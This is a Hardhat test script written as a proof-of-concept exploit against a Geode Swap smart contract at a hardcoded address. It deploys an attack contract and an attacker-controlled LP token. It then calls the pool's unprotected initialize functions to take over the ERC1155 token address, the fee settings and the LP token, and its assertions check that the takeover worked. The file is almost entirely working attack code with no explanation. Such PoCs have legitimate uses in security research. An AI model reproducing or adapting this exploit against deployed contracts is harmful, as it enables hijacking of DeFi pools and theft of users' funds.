const { expect } = require("chai");
const { providers } = require("ethers");
const { parseUnits, hexValue } = require("ethers/lib/utils");
const { ethers, network } = require("hardhat");

describe("Geode Test", () => {
  let accounts;
  // main contracts
  let attack;
  let hackerLP;

  let geodeSwap = "0xCD8951A040Ce2c2890d3D92Ea4278FF23488B3ac"

  // attacker values
  let gAVAX;
  let pooledTokenId = 3;
  let lpTokenName = "xxx :(";
  let lpTokenSymbol = "XXX :(";
  let a = 300;
  let fee = 400;
  let adminFee = 500;
  // let lpTokenTargetAddress = "0x71B0CD5c4Db483aE8A09Df0f83F69BAC400dBe8c";

  before(async () => {
    accounts = await ethers.getSigners();
  });

  it("Should deploy geode hack contract", async () => {
    const ATTACK = await ethers.getContractFactory("Geode_Attack");
    attack = await ATTACK.deploy();
    await attack.deployed();
    console.log("attack contract address: ", attack.address);
  });

  it("Should deploy attacker lp contract", async () => {
    const LP = await ethers.getContractFactory("LPToken");
    hackerLP = await LP.deploy();
    await hackerLP.deployed();
    console.log("hackerLP contract address: ", hackerLP.address);
  });

  it("Should call initialize function in Geode Swap contract", async () => {
    gAVAX = attack.address;
    await attack.callInitialize(gAVAX,pooledTokenId,lpTokenName,lpTokenSymbol,a,fee,adminFee,hackerLP.address);
  });

  it("Should get ERC1155 address from Geode Swap contract set by attacker", async () => {
    const swap = await ethers.getContractAt("IGEODESWAP", geodeSwap);
    let address = await swap.getERC1155();

    console.log(address);
    expect(address).to.equal(attack.address);
  });

  it("Should get amplification coefficient from Geode Swap contract set by attacker", async () => {
    const swap = await ethers.getContractAt("IGEODESWAP", geodeSwap);
    let _a = await swap.getA();

    console.log(_a);
    expect(_a).to.equal(a);
  });

  it("Should get id of the pooled gAvax token from Geode Swap contract set by attacker", async () => {
    const swap = await ethers.getContractAt("IGEODESWAP", geodeSwap);
    let id = await swap.getToken();

    console.log(id);
    expect(id).to.equal(pooledTokenId);
  });

  it("Should revert on second call to initialize function", async () => {
    await expect(attack.callInitialize()).to.be.reverted;
  });


  it("Should call initialize function for lp in Geode Swap contract", async () => {
    gAVAX = attack.address;
    await attack.callinitToken();
  });

  it("Should call initialize function for proxy in Geode Swap contract", async () => {
    gAVAX = attack.address;
    await attack.callinitProxy();
  });

});
